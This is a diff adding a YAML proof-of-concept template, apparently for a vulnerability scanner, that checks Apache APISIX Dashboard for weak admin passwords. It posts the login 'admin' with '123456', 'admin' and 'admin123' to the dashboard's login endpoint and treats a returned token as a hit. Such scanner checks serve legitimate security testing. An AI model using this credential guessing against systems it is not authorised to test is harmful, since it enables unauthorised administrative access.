@@ -1,0 +1,24 @@
+id: poc-yaml-apache-apisix-dashboard-weak-pass
+info:
+  name: Apache APISIX Dashboard 弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: Apache
+  osprey-id: vb_2020_0087
+variables:
+  r_password: '123456
+
+    admin
+
+    admin123'
+requests:
+- method: POST
+  path: /apisix/admin/user/login
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"username":"admin","password":"{{.r_password}}"}'
+  expression: 'contains(body, "{\"code\":0,\"message\":\"\",\"data\":{\"token\":\"")
+
+    '
+transport: http
